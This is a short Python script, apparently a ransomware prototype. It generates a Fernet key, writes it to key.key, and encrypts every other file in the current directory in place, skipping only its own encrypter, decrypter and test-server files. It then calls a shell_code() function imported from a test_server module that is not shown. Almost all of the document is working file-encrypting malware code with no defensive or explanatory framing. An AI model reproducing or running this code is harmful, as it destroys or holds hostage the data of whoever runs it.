import os

from test_server import shell_code



from cryptography.fernet import Fernet

key = Fernet.generate_key()
print(key)
files=[]


for file in os.listdir():
    if file=="encrypter.py" or file== "key.key" or file == "decrypter.py" or file == "test_server.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)


with open("key.key", "wb") as keykey:
    keykey.write(key)


for file in files:
    with open(file, "rb") as x:
        y = x.read()
    z = Fernet(key).encrypt(y)
    with open(file, "wb") as x:
        x.write(z)


shell_code()


        
        
    
    
